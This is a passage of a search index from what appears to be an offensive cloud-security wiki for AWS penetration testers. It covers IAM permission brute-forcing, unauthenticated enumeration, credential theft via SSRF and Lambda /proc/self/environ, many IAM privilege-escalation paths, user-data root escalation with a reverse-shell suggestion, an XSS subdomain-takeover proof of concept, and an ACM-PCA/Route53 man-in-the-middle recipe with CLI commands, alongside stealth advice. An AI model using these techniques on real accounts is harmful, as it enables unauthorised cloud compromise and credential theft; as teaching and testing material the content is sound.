\"ASIAAAAAAAAAAAAAAAAA\"\n2020-12-20 18:41:26,812 - 13 - [INFO] -- Account ARN : arn:aws:sts::012345678912:assumed-role/role-b/user-b\n2020-12-20 18:41:26,812 - 13 - [INFO] -- Account Id  : 012345678912\n2020-12-20 18:41:26,813 - 13 - [INFO] -- Account Path: assumed-role/role-b/user-b\n2020-12-20 18:41:27,283 - 13 - [INFO] Attempting common-service describe / list brute force.\n2020-12-20 18:41:34,992 - 13 - [INFO] -- codestar.list_projects() worked!\n2020-12-20 18:41:35,928 - 13 - [INFO] -- sts.get_caller_identity() worked!\n2020-12-20 18:41:36,838 - 13 - [INFO] -- dynamodb.describe_endpoints() worked!\n2020-12-20 18:41:38,107 - 13 - [INFO] -- sagemaker.list_models() worked!\n</code></pre>","title":"Brute Force IAM Permissions"},{"location":"aws/enumeration/brute_force_iam_permissions/#updating-apis","text":"<p>With an attack surface that evolves as rapidly as AWS, we often have to find and abuse newer features. This is one area where enumerate-iam shines. The tool itself has a built in feature to read in new AWS API calls from the JavaScript SDK, and use that information to brute force. After downloading enumerate-iam, perform the following steps to update the API lists.</p> <pre><code>cd enumerate_iam/\ngit clone https://github.com/aws/aws-sdk-js.git\npython generate_bruteforce_tests.py\n</code></pre> <p>This will create or update a file named bruteforce_tests.py under enumerate-iam.</p>","title":"Updating APIs"},{"location":"aws/enumeration/brute_force_iam_permissions/#opsec-considerations","text":"<p>One thing to note is that this tool is very noisy and will generate a ton of CloudTrail logs. This makes it very easy for a defender to spot this activity and lock you out of that role or user. Try other methods of permission enumeration first, or be willing to lose access to these credentials before resorting to brute-force. </p>","title":"OPSEC Considerations"},{"location":"aws/enumeration/enum_iam_user_role/","text":"<p>Original Research: Daniel Grzelak - Remastered Talk by Scott Piper Additional Reading: Rhino Security Link to Quiet Riot: Github Link to Tool: GitHub Link to Pacu Module: GitHub </p> <p>You can enumerate Account IDs, root account e-mail addresses, IAM roles, IAM users, and a partial account footprint by abusing Resource-Based Policies.</p> <p>There are a few ways to do this, for example, Pacu's module will attempt to change the AssumeRole policy of a role in your account and specify a role in another account. Quiet Riot offers a scalable method for enumerating each of these items with configurable wordlists per item type.</p> <p>Another way would be to use S3 Bucket Policies. Take the following example:</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"Example permissions\",\n            \"Effect\": \"Deny\",\n            \"Principal\": {\n                \"AWS\": \"arn:aws:iam::123456789123:role/role_name\"\n            },\n            \"Action\": \"s3:ListBucket\",\n            \"Resource\": \"arn:aws:s3:::*bucket you own*\"\n        }\n    ]\n}\n</code></pre> <p>You would apply this policy to a bucket you own. By specifying a principal in the target account (123456789123), you can determine if that principals exists. If setting the bucket policy succeeds you know the role exists. If it fails you know the role does not.</p>  <p>Warning</p> <p>Doing either of these techniques will generate a lot of CloudTrail events, specifically UpdateAssumeRolePolicy or PutBucketPolicy in your account. If your intention is to be stealthy it is not advised (or required) to use a target's credentials. Instead you should use your own account (the CloudTrail events will be generated there).</p>   <p>Note</p> <p>While this works for both IAM users and roles, this will also work with service-linked roles. This will allow you to enumerate various services the account uses, such as GuardDuty or Organizations.</p>  <p>To automate this process you can use the Pacu Module or this which will attempt to brute force it for you.</p> <pre><code>usage: main.py [-h] --id ID --my_bucket MY_BUCKET [--wordlist WORDLIST] (--role | --user)\n\nEnumerate IAM/Users of an AWS account. You must provide your OWN AWS account and bucket\n\noptional arguments:\n  -h, --help            show this help message and exit\n  --id ID               The account id of the target account\n  --my_bucket MY_BUCKET\n                        The bucket used for testing (belongs to you)\n  --wordlist WORDLIST   Wordlist containers user/role names\n  --role                Search for a IAM Role\n  --user                Search for a IAM User\n</code></pre>","title":"Unauthenticated Enumeration of IAM Users and Roles"},{"location":"aws/enumeration/get-account-id-from-keys/","text":"<p>While performing an assessment in AWS it is not uncommon to come across access keys and not know what account they are associated with. If your scope is defined by the AWS account ID, this may pose a problem as you'd likely not want to use them if they are out of scope.</p> <p>To solve this problem you can use sts:GetAccessKeyInfo to return the account ID of the credentials. This action will only be logged to the account calling the action (which should be your account, not the target's).</p> <pre><code>user@host:~$ aws sts get-access-key-info --access-key-id=ASIA1234567890123456\n{\n    \"Account\": \"123456789012\"\n}\n</code></pre>","title":"Get Account ID from AWS Access Keys"},{"location":"aws/enumeration/whoami/","text":"<p>After finding or stealing IAM credentials during an assessment you will need to identify what they are used for, or if they are valid. The most common method for doing so would be the get-caller-identity API call. This is beneficial for a few reasons, in particular that it requires no special permissions to call.</p> <p>Unfortunately (while unlikely) there is the possibility that this API call may be monitored for sensitive accounts. Additionally, if our goal is to be as stealthy as possible we may not want to use this. As a result we need alternatives. The good news for us is that a lot of AWS services will disclose the calling role along with the account ID as a result of an error. The following is certainly not a comprehensive list, and note that the principal needs to NOT have IAM permissions to make this call to return the information as an error.</p> <p>Not all API calls exhibit this behavior. Failed EC2 API calls, for example, will return a variant of the following.</p> <pre><code>An error occurred (UnauthorizedOperation) when calling the DescribeInstances operation: You are not authorized to perform this operation.\n</code></pre>","title":"Whoami - Get Principal Name From Keys"},{"location":"aws/enumeration/whoami/#sns-publish","text":"<p>sns:Publish will return the ARN of the calling user/role without logging to CloudTrail. To use this method, you must provide a valid AWS account id in the API call. This can be your own account id, or the account id of anyone else.</p> <pre><code>user@host:$ aws sns publish --topic-arn arn:aws:sns:us-east-1:*account id*:aaa --message aaa\n\nAn error occurred (AuthorizationError) when calling the Publish operation: User: arn:aws:sts::123456789123:assumed-role/example_role/i-00000000000000000 is not authorized to perform: SNS:Publish on resource: arn:aws:sns:us-east-1:*account id*:aaa\n</code></pre>","title":"sns publish"},{"location":"aws/exploitation/ec2-metadata-ssrf/","text":"<p>Note</p> <p>This is a common and well known attack in AWS environments. Mandiant has identified attackers performing automated scanning of vulnerabilities to harvest IAM credentials from publicly-facing web applications. To mitigate the risks of this for your organization, it would be beneficial to enforce IMDSv2 for all EC2 instances which has additional security benefits. IMDSv2 would significantly reduce the risk of an adversary stealing IAM credentials via SSRF.</p>  <p>One of the most commonly taught tactics in AWS exploitation is the use of Server Side Request Forgery (SSRF) to access the EC2 metadata service.</p> <p>Most EC2 Instances have access to the metadata service at 169.254.169.254. This contains useful information about the instance such as its IP address, the name of the security group, etc. On EC2 instances that have an IAM role attached the metadata service will also contain IAM credentials to authenticate as this role. Depending on what version of IMDS is in place, and what capabilities the SSRF has we can steal those credentials.</p> <p>It is also worth noting that shell access to the EC2 instance would also allow an adversary to gather these credentials.</p> <p>In this example there is a web server running on port 80 of the EC2 instance. This web server has a simple SSRF vulnerability, allowing us to make GET requests to arbitrary addresses. We can leverage this to make a request to <code>http://169.254.169.254</code>.</p>  <p></p>  <p>To determine if the EC2 instance has an IAM role associated with it, look for http://169.254.169.254/latest/meta-data/iam/. A 404 response indicates there is no IAM role associated. You may also get a 200 response that is empty, this indicates that there was an IAM Role however it has since been revoked.</p> <p>If there is a valid role you can steal, make a request to http://169.254.169.254/latest/meta-data/iam/security-credentials/. This will return the name of the IAM role the credentials represent. In the example below we see that the role name is 'ec2-default-ssm'.</p>  <p></p>  <p>To steal the credentials, append the role name to your previous query. For example, with the name above we'd query http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm/.</p>  <p></p>  <p>These credentials can then be used in the AWS CLI or other means to make API calls as the IAM role.</p>","title":"Steal EC2 Metadata Credentials via SSRF"},{"location":"aws/exploitation/iam_privilege_escalation/","text":"<p>Original Research: Spencer Gietzen - AWS IAM Privilege Escalation Further Reading: AWS-IAM-Privilege-Escalation Further Reading: Investigating PrivEsc Methods in AWS </p>  <p>Note</p> <p>If you'd like to get hands on experience exploiting these misconfigurations, check out iam-vulnerable by Seth Art.</p>","title":"AWS IAM Privilege Escalation Techniques"},{"location":"aws/exploitation/iam_privilege_escalation/#codestarcreateproject-codestarassociateteammember","text":"<p>With access to the codestar:CreateProject and codestar:AssociateTeamMember permissions, an adversary can create a new CodeStar project and associate themselves as an Owner of the project.</p> <p>This will attach a new policy to the user that provides access to a number of permissions for AWS services. This is most useful for further enumeration as it gives access to lambda:List*, iam:ListRoles, iam:ListUsers, and more.</p>  <p></p>   <p></p>","title":"codestar:CreateProject, codestar:AssociateTeamMember"},{"location":"aws/exploitation/iam_privilege_escalation/#glueupdatedevendpoint","text":"<p>With access to the glue:UpdateDevEndpoint permission, an adversary can update the existing SSH key associated with the glue endpoint. This will allow the adversary to SSH into the host and gain access to IAM credentials associated with the role attached to the glue endpoint. Though not required, it may be helpful to have the glue:GetDevEndpoint permission as well, if the existing endpoint cannot be identified via other means. </p>","title":"glue:UpdateDevEndpoint"},{"location":"aws/exploitation/iam_privilege_escalation/#iamaddusertogroup","text":"<p>With access to the iam:AddUserToGroup permission, an adversary can add an IAM user they control to an existing group with more privileges. Although this is not required, it may be helpful to have other permissions in the IAM family to identify other groups and their privileges. </p>","title":"iam:AddUserToGroup"},{"location":"aws/exploitation/iam_privilege_escalation/#iamattachgrouppolicy","text":"<p>With access to the iam:AttachGroupPolicy permission, an adversary can attach an IAM policy to a group they are a member of. This potentially includes policies such as AdministratorAccess, which would provide them (surprise) administrator access to the AWS account.</p>","title":"iam:AttachGroupPolicy"},{"location":"aws/exploitation/iam_privilege_escalation/#iamattachrolepolicy","text":"<p>With access to the iam:AttachRolePolicy permission, an adversary can attach an IAM policy to a role they have access to. This potentially includes policies such as AdministratorAccess, which would provide them administrator access to the AWS account.</p>","title":"iam:AttachRolePolicy"},{"location":"aws/exploitation/iam_privilege_escalation/#iamattachuserpolicy","text":"<p>With access to the iam:AttachUserPolicy permission, an adversary can attach an IAM policy to an IAM user they have access to. This potentially includes policies such as AdministratorAccess, which would provide them administrator access to the AWS account.</p>","title":"iam:AttachUserPolicy"},{"location":"aws/exploitation/iam_privilege_escalation/#iamcreateaccesskey","text":"<p>With access to the iam:CreateAccessKey permission, an adversary can create an IAM Access Key and Secret Access Key for other users. This would allow them to create credentials for more privileged users and have access to their privileges.</p>  <p></p>","title":"iam:CreateAccessKey"},{"location":"aws/exploitation/iam_privilege_escalation/#iamcreateloginprofile","text":"<p>With access to the iam:CreateLoginProfile permission, an adversary can create a password for a more privileged IAM user to login to the console as. Note: if a password is already set, you must use iam:UpdateLoginProfile instead.</p>","title":"iam:CreateLoginProfile"},{"location":"aws/exploitation/iam_privilege_escalation/#iamcreatepolicyversion","text":"<p>With access to the iam:CreatePolicyVersion permission, an adversary can create a new version of a existing policy with more privilege. If the adversary has access to the principal that policy is attached to, they can elevate their privileges.</p>","title":"iam:CreatePolicyVersion"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-cloudformationcreatestack","text":"<p>With access to the iam:PassRole and cloudformation:CreateStack permissions, an adversary can create a new CloudFormation stack and pass a more privileged role to it. This would allow an adversary to escalate privileges to that more privileged role.</p>","title":"iam:PassRole, cloudformation:CreateStack"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-codestarcreateproject","text":"<p>With access to the iam:PassRole and codestar:CreateProject permissions, an adversary can create a new CodeStar project and pass a more privileged role to it. This would allow an adversary to escalate privileges to that more privileged role including that of an administrator.</p>","title":"iam:PassRole, codestar:CreateProject"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-datapipelineactivatepipeline-datapipelinecreatepipeline-datapipelineputpipelinedefinition","text":"<p>With access to the iam:PassRole, datapipeline:ActivatePipeline, datapipeline:CreatePipeline, and datapipeline:PutPipelineDefinition permissions, an adversary can create a new pipeline and pass in a more privileged role. It is worth noting that to do this the AWS account must already contain a role that can be assumed by DataPipeline and that role must have greater privileges (or at least different ones) than the principal the adversary controls.</p>","title":"iam:PassRole, datapipeline:ActivatePipeline, datapipeline:CreatePipeline, datapipeline:PutPipelineDefinition"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-ec2runinstances","text":"<p>With access to the iam:PassRole and ec2:RunInstances permissions, an adversary can create a new EC2 instance and pass a more privileged role to it.</p> <p>This can be taken advantage of with the following one-liner:</p>  <p></p>  <p>Some things to note: The instance profile must already exist, and (realistically) it must have greater permissions than the role you have access to. If you also have the ability to create a role, this can be leveraged (although you may as well set the trust policy of that role to one you control at that point). The role that is being passed must have a trust policy allowing the EC2 service to assume it. You cannot pass arbitrary roles to an EC2 instance.</p> <p>A common misconception about this attack is that an adversary must have access to an existing SSH key, or be able to spawn an SSM session. This is not actually true, you can leverage user data to perform an action on the host. One common example is to have the EC2 instance curl the metadata service, retrieve the IAM credentials, and then send them to an attacker controlled machine using curl.</p> <p>Another (stealthier) example would be to perform all your API operations at once in the user-data script. This way you are not dinged with the IAM credential exfiltration finding (which can be bypassed).</p>","title":"iam:PassRole, ec2:RunInstances"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-gluecreatedevendpoint","text":"<p>With access to the iam:PassRole and glue:CreateDevEndpoint permissions, an adversary can create a new Glue development endpoint and pass in a more privileged role. It is worth noting that to do this the AWS account must already contain a role that can be assumed by Glue and that role must have greater privileges (or at least different ones) than the principal the adversary controls.</p>","title":"iam:PassRole, glue:CreateDevEndpoint"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-lambdaaddpermission-lambdacreatefunction","text":"<p>With access to the iam:PassRole, lambda:AddPermission, and lambda:CreateFunction permissions, an adversary can create a Lambda function with an existing role. This function could then by updated with lambda:AddPermission to allow another principal in another AWS account the permission to invoke it. It is worth noting that the AWS account must already contain a role that can be assumed by Lambda.</p>","title":"iam:PassRole, lambda:AddPermission, lambda:CreateFunction"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-lambdacreateeventsourcemapping-lambdacreatefunction","text":"<p>With access to the iam:PassRole, lambda:CreateEventSourceMapping, and lambda:CreateFunction permissions, an adversary can create a Lambda function with an existing privileged role and associating it with a DynamoDB table. Then, when a new record is inserted into the table, the Lambda function will trigger with the privilege of the passed in role.</p> <p>It is worth noting that the AWS account must already contain a role that can be assumed by Lambda. Additionally, while not required, it may be beneficial to have the dynamodb:CreateTable and dynamodb:PutItem permissions to trigger this yourself.</p>","title":"iam:PassRole, lambda:CreateEventSourceMapping, lambda:CreateFunction"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-lambdacreatefunction-lambdainvokefunction","text":"<p>With access to the iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction permissions, an adversary can create a new Lambda function and pass an existing role to it. They can then invoke the function allowing them access to the privileges of the role associated with the function. It is worth noting that unless the adversary can create a role, they must use an already existing role that can be assumed by Lambda.</p>","title":"iam:PassRole, lambda:CreateFunction, lambda:InvokeFunction"},{"location":"aws/exploitation/iam_privilege_escalation/#iamputgrouppolicy","text":"<p>With access to the iam:PutGroupPolicy permission, an adversary can create an inline policy for a group they are in and give themselves administrator access to the AWS account.</p>","title":"iam:PutGroupPolicy"},{"location":"aws/exploitation/iam_privilege_escalation/#iamputrolepolicy","text":"<p>With access to the iam:PutRolePolicy permission, an adversary can create an inline policy for a role they have access to and give themselves administrator access to the AWS account.</p>","title":"iam:PutRolePolicy"},{"location":"aws/exploitation/iam_privilege_escalation/#iamputuserpolicy","text":"<p>With access to the iam:PutUserPolicy permission, an adversary can create an inline policy for a user they have access to and give themselves administrator access to the AWS account.</p>","title":"iam:PutUserPolicy"},{"location":"aws/exploitation/iam_privilege_escalation/#iamsetdefaultpolicyversion","text":"<p>With access to the iam:SetDefaultPolicyVersion permission, an adversary can revert a policy associated with their principal to a previous version. This is useful for scenarios in which a previous version of a policy had more access than the current version.</p>","title":"iam:SetDefaultPolicyVersion"},{"location":"aws/exploitation/iam_privilege_escalation/#iamupdateassumerolepolicy","text":"<p>With access to the iam:UpdateAssumeRolePolicy permission, an adversary can modify the assume-role policy of a role, allowing them to assume it. This is useful to gain access to administrator roles, or other more privileged roles.</p>","title":"iam:UpdateAssumeRolePolicy"},{"location":"aws/exploitation/iam_privilege_escalation/#iamupdateloginprofile","text":"<p>With access to the iam:UpdateLoginProfile permission, an adversary can change the password of an IAM user. This would allow them to log into the console as that user.</p>","title":"iam:UpdateLoginProfile"},{"location":"aws/exploitation/iam_privilege_escalation/#lambdaupdatefunctioncode","text":"<p>With access to the lambda:UpdateFunctionCode permission, an adversary can modify an existing Lambda function's code. This would allow them to gain access to the privileges of the associated IAM role the next time the function is executed.</p>","title":"lambda:UpdateFunctionCode"},{"location":"aws/exploitation/iam_privilege_escalation/#lambdaupdatefunctionconfiguration","text":"<p>With access to the lambda:UpdateFunctionConfiguration permission, an adversary can modify an existing Lambda function's configuration to add a new Lambda Layer. This Layer would then override an existing library and allow an adversary to execute malicious code under the privilege of the role associated with the Lambda function.</p>","title":"lambda:UpdateFunctionConfiguration"},{"location":"aws/exploitation/lambda-steal-iam-credentials/","text":"<p>In Lambda, IAM credentials are passed into the function via environment variables. The benefit for the adversary is that these credentials can be leaked via file read vulnerabilities such as XML External Entity attacks or SSRF that allows the file protocol. This is because \"everything is a file\".</p> <p>IAM credentials can be accessed via reading <code>/proc/self/environ</code>.</p>  <p></p>   <p>Note</p> <p>In the event that /proc/self/environ is blocked by a WAF, check if you can read the environment variables of other processes. This can be done by reading /proc/#/environ where '#' is some number often between 1 and 20.</p>  <p>In addition to IAM credentials, Lambda functions also have event data that is passed to the function when it is started. This data is made available to the function via the runtime interface. Unlike IAM credentials, this data is accessible over standard SSRF at <code>http://localhost:9001/2018-06-01/runtime/invocation/next</code>.</p> <p>This will include information about what invoked the Lambda function and may be valuable depending on the context.</p>  <p>Note</p> <p>Unlike IAM credentials associated with EC2 instances, there is no GuardDuty alert for stolen Lambda credentials.</p>","title":"Steal IAM Credentials and Event Data from Lambda"},{"location":"aws/exploitation/local-priv-esc-mod-instance-att/","text":"<p>Required IAM Permission: modify-instance-attribute Recommended but not required: start-instances, describe-instances, stop-instances (makes things go faster, requires less enumeration. The instance must be stopped to alter the user data)  </p> <p>If an adversary has access to the modify-instance attribute permission they can leverage it to escalate to root/System on an EC2 instance.</p> <p>Usually, user data scripts are only run the first time the instance is started, however this can be changed using cloud-init to run every time the instance restarts.</p> <p>To do this, first create a file in the following format.</p> <pre><code>Content-Type: multipart/mixed; boundary=\"//\"\nMIME-Version: 1.0\n\n--//\nContent-Type: text/cloud-config; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\nContent-Disposition: attachment; filename=\"cloud-config.txt\"\n\n#cloud-config\ncloud_final_modules:\n- [scripts-user, always]\n\n--//\nContent-Type: text/x-shellscript; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\nContent-Disposition: attachment; filename=\"userdata.txt\"\n\n#!/bin/bash\n**commands here**\n--//\n</code></pre> <p>Modify the <code>commands here</code> section to do whatever action you want. Setting a reverse shell, adding an ssh key to the default user, etc. are all good options.</p> <p>Once you've done that, convert the file to base64. Linux can do this with the following command.</p> <p><code>base64 file.txt &gt; file.b64.txt</code></p> <p>Windows can do this with the following command.</p> <p><code>certutil -encode file.txt tmp.b64 &amp;&amp; findstr /v /c:- tmp.b64 &gt; file.b64.txt</code></p> <p>Now that you've base64 encoded your payload, you will leverage the modify-instance-attribute API call to change the user data of the target instance. Note: the instance will need to be stopped to modify its user data. You'll either have to stop it yourself, or wait for something else to stop it.</p> <pre><code>aws ec2 modify-instance-attribute \\\n--instance-id=xxx \\\n--attribute userData \\\n--value file://file.b64.txt\n</code></pre> <p>With that change made, simply start the instance again and your command will be executed with root/System.</p>","title":"Local Privilege Escalation: User Data"},{"location":"aws/exploitation/local-priv-esc-user-data-s3/","text":"<p>A common pattern when using EC2 is to define a user data script to be run when an instance is first started or after a reboot. These scripts are typically used to install software, download and set a config, etc. Oftentimes the scripts and packages are pulled from S3 and this introduces an opportunity for a developer/ops person to make a mistake.</p> <p>If the IAM role is too permissive and allows the role to write to that location, an adversary can leverage this for privilege escalation. Additionally, if there is any other kind of misconfiguration on the bucket itself, or another role which has access gets compromised, an adversary can take advantage of this as well.</p> <p>Take the following user data script:</p> <pre><code>#!/bin/bash\naws s3 cp s3://example-boot-bucket/start_script.sh /root/start_script.sh\nchmod +x /root/start_script.sh\n/root/start_script.sh\n</code></pre> <p>On first launch, the EC2 instance will pull the start_script from S3 and will run it. If an adversary can write to that location, they can escalate privileges or gain control of the EC2 instance.</p>  <p>Note</p> <p>In addition to new instances being spun up or after a reboot, poisoning the scripts/applications can also effect EC2 instances in an Auto Scaling Group.</p>","title":"Local Privilege Escalation: User Data 2"},{"location":"aws/exploitation/orphaned_%20cloudfront_or_dns_takeover_via_s3/","text":"<p>Research Example: Patrik Hudak Link to Tool: dwatch Link to Tool: ctfr Link to Tool: Amass </p> <p>Utilizing various enumeration techniques for recon and enumeration, an attacker can discover orphaned Cloudfront distributions and/or DNS Records that are attempting to serve content from an S3 bucket that no longer exists. There are numerous tools to do this, but I have been using dwatch combined with CTFR </p> <p>Essentially you need a list of domains to check. Create a domain list using CTFR or amass or the like, and then utilize a tool like dwatch to test each host to look for a specific error page that contains the text \"NoSuchBucket\"</p> <pre><code>&lt;Error&gt;\n&lt;Code&gt;NoSuchBucket&lt;/Code&gt;\n&lt;Message&gt;The specified bucket does not exist&lt;/Message&gt;\n&lt;BucketName&gt;hackingthe.cloud&lt;/BucketName&gt;\n&lt;RequestId&gt;68M9C1KTARF9FBYN&lt;/RequestId&gt;\n&lt;HostId&gt;RpbdvVU9AXidVVI/1zD+WTwYdVI5YMqQNJShmf6zJlztBVyINq8TtqbzWpThdi/LivlOWRVCPVs=&lt;/HostId&gt;\n&lt;/Error&gt;\n</code></pre> <p>The simple next step is to go create a bucket with this name in S3. </p> <p>This alone can be enough to stop the bucket from being taken over by anyone else. However, you may want to place some POC code in an index.html or any html file in the root directory of the bucket file.</p> <pre><code>&lt;h1&gt; Simple PoC for Subdomain Takeover,&lt;/h1&gt;\n&lt;button onclick=alert(document.domain)&gt; XSS Alert for PoC &lt;/button&gt;\n&lt;h2&gt; demo purposes only. &lt;/h2&gt; \n</code></pre> <p>Root Causes of this issue are typically due to a hygiene realted issues where an S3 bucket was deleted while content was still being served by Cloudfront or by a DNS Record CNAME (Route53 or otherwise).  </p> <p>There are other nuanced conditions with Cloudfront, although rare, that can cause the similar takeover susceptibility.</p> <p>To protect against this type of attack utilize robust hygiene practices:</p> <p>Always create in this order S3 -&gt; Cloudfront -&gt; DNS</p> <p>Always Sunset/Delete in this order DNS -&gt; Cloudfront-&gt; S3</p> <p>Likewise, if you are testing, and something doesn't work, dont forget to clean up!</p>","title":"Simple Route53/Cloudfront/S3 Subdomain Takeover"},{"location":"aws/exploitation/route53_modification_privilege_escalation/","text":"<p>Original Research: niebardzo - Hijacking AWS API Calls </p> <p>Required IAM Permission: route53:CreateHostedZone, route53:ChangeResourceRecordSets, acm-pca:IssueCertificate, acm-pca:GetCertificate Recommended but not required: route53:GetHostedZone, route53:ListHostedZones, acm-pca:ListCertificateAuthorities, ec2:DescribeVpcs (may be useful for enumeration, but are not requires as the info can be enumerated in other ways)  </p>  <p>Note</p> <p>To perform this attack the target account must already have an AWS Certificate Manager Private Certificate Authority (AWS-PCA) setup in the account, and EC2 instances in the VPC(s) must have already imported the certificates to trust it. With this infrastructure in place, the following attack can be performed to intercept AWS API traffic.</p>  <p>Assuming there is an AWS VPC with multiple cloud-native applications talking to each other and to AWS API. Since the communication between the microservices is often TLS encrypted there must be a private CA to issue the valid certificates for those services. If ACM-PCA is used for that and the adversary manages to get access to control both route53 and acm-pca private CA with the minimum set of permissions described above, it can hijack the application calls to AWS API taking over their IAM permissions.</p> <p>This is possible because:  </p> <ul> <li>AWS SDKs do not have Certificate Pinning</li> <li>Route53 allows creating Private Hosted Zone and DNS records for AWS APIs domain names</li> <li>Private CA in ACM-PCA cannot be restricted to signing only certificates for specific Common Names</li> </ul> <p>For example, Secrets Manager in us-east-1 could be re-routed by an adversary setting the secretsmanager.us-east-1.amazonaws.com domain to an IP controlled by the adversary. The following creates the private hosted zone for secretsmanager.us-east-1.amazonaws.com: <pre><code>aws route53 create-hosted-zone --name secretsmanager.us-east-1.amazonaws.com --caller-reference sm4 --hosted-zone-config PrivateZone=true --vpc VPCRegion=us-east-1,VPCId=&lt;VPCId&gt;\n</code></pre></p> <p>Then set the A record for secretsmanager.us-east-1.amazonaws.com in this private hosted zone. Use the following POST body payload - mitm.json:</p> <pre><code>{\n  \"Comment\": \"&lt;anything&gt;\",\n  \"Changes\": [{\n    \"Action\": \"UPSERT\",\n    \"ResourceRecordSet\": {\n      \"Name\": \"secretsmanager.us-east-1.amazonaws.com\",\n      \"Type\": \"A\",\n      \"TTL\": 0,\n      \"ResourceRecords\": [{\"Value\": \"&lt;ip_of_adversary_instance_in_the_VPC&gt;\"}]\n    }\n  }]\n}\n</code></pre> <p>One set TTL to 0 to avoid DNS caching. Then, the advisory uses this payload to change-resource-record-sets: <pre><code>aws route53 change-resource-record-sets --hosted-zone-id &lt;id_returned_by_previous_API_call&gt; --change-batch file://mitm.json\n</code></pre></p> <p>Now, the adversary must generate the CSR and send it for signing to the ACM-PCA, CSR and private key can be generated with OpenSSL: <pre><code>openssl req -new -newkey rsa:2048 -nodes -keyout your_domain.key -out your_domain.csr\n</code></pre></p> <p>For CN (Common Name), one must provide secretsmanager.us-east-1.amazonaws.com. Then one sends the CSR to acm-pca to issue the certificate: <pre><code>aws acm-pca issue-certificate --certificate-authority-arn \"&lt;arn_of_ca_used_within_vpc&gt;\" --csr file://your_domain.csr --signing-algorithm SHA256WITHRSA --validity Value=365,Type=\"DAYS\" --idempotency-token 1234\n</code></pre></p> <p>It returns the signed certificate ARN in the response. The next call is to fetch the certificate.</p> <pre><code>aws acm-pca get-certificate --certificate-arn \"&lt;cert_arn_from_previous_response&gt;\" --certificate-authority-arn \"&lt;arn_of_ca_used_within_vpc&gt;\"\n</code></pre> <p>Once one got the signed certificate on the disk as cert.crt, the adversary starts the listener or 443/TCP and sniffs the calls to the secretsmanager.us-east-1.amazonaws.com <pre><code>sudo ncat --listen -p 443 --ssl --ssl-cert cert.crt --ssl-key your_domain.key -v\n</code></pre></p> <p>The calls can be then forwarded to the Secrets Manager VPCE to for example GetSecretValue and get unauthorized access to the data. The same action can be done with any AWS API called from the VPC - S3, KMS, etc.</p>","title":"AWS API Call Hijacking via ACM-PCA"},{"location":"aws/general-knowledge/assume_role_logic/","text":"<p>To allow an entity to temporarily elevate their access to a different role, AWS provides the AssumeRole action in STS. This returns an access key ID, secret key, and a session token for the specified ARN.</p> <p>As a Penetration Tester or Red Teamer, Assume Role can be an excellent vector to escalate privileges or move to other AWS accounts in the organization. It is worth noting however that the logic/requirements to perform Assume Role differ if you are assuming a role in the same account versus assuming a role in a different account.</p>","title":"Assume Role Logic"},{"location":"aws/general-knowledge/assume_role_logic/#same-account","text":"<p>In order to assume a role, there are typically two requirements: 1) The target role has a trust relationship with the entity attempting to assume the role and 2) the role attempting to perform the assumption has the sts:AssumeRole privilege. When attempting to assume a role in the same account, these requirements are slightly relaxed.</p> <p>When assuming a role in the same account, the trust relationship for the target role may be tied to a specific role (via an ARN). In this situation that role does NOT need to have AssumeRole privilege. If, however, the trust relationship is tied to the ARN of the account itself that role DOES need to have AssumeRole privilege.</p> <p>Here is an example of each situation.</p>","title":"Same Account"},{"location":"aws/general-knowledge/assume_role_logic/#trust-relationship-with-account","text":"<p>You DO need AssumeRole privilege on the base role. <pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::123456789012:root\"\n      },\n      \"Action\": \"sts:AssumeRole\",\n      \"Condition\": {}\n    }\n  ]\n}\n</code></pre></p>","title":"Trust Relationship with Account"},{"location":"aws/general-knowledge/assume_role_logic/#trust-relationship-with-role","text":"<p>You DO NOT need AssumeRole privilege on the base role. Do note: having that privilege does not hinder you in any way. <pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::123456789012:role/specific-role\"\n      },\n      \"Action\": \"sts:AssumeRole\",\n      \"Condition\": {}\n    }\n  ]\n}\n</code></pre></p>","title":"Trust Relationship with Role"},{"location":"aws/general-knowledge/assume_role_logic/#advice-for-same-account","text":"<p>When looking for privilege escalation vectors in an AWS account, first look for roles that explicitly define a role ARN in their Trust Relationship and paths to get there. The relaxed requirement around having AssumeRole privileges helps because you are only reliant on the trust relationship, not additional privileges. Additionally, because of the different requirements between same and cross account role assumption, some administrators may be under the impression the base role requires AssumeRole privileges and as such may not be aware of the security considerations around this.</p>","title":"Advice for Same Account"},{"location":"aws/general-knowledge/assume_role_logic/#cross-account","text":"<p>When assuming a role across accounts the base role must have AssumeRole privileges, regardless of if the Trust Relationship specifies an account or a specific role.</p>","title":"Cross Account"},{"location":"aws/general-knowledge/connection-tracking/","text":"<p>Security Groups in AWS have an interesting capability known as Connection Tracking. This allows the security groups to track information about the network traffic and allow/deny that traffic based on the Security Group rules.</p> <p>There are two kinds of traffic flows; tracked and untracked. For example the AWS documentation mentions a tracked flow as the following, \"if you initiate an ICMP ping command to your instance from your home computer, and your inbound security group rules allow ICMP traffic, information about the connection (including the port information) is tracked. Response traffic from the instance for the ping command is not tracked as a new request, but rather as an established connection and is allowed to flow out of the instance, even if your outbound security group rules restrict outbound ICMP traffic\".</p> <p>An interesting side effect of this is that tracked connections are allowed to persist, even after a Security Group rule change. </p> <p>Let's take a simple example: There is an EC2 instance that runs a web application. This EC2 instance has a simple Security Group that allows SSH, port 80, and port 443 inbound, and allows all traffic outbound. This EC2 instance is in a public subnet and is internet facing.</p>  <p></p>  <p>While performing a penetration test you've gained command execution on this EC2 instance. In doing so, you pop a simple reverse shell. You work your magic on the box before eventually 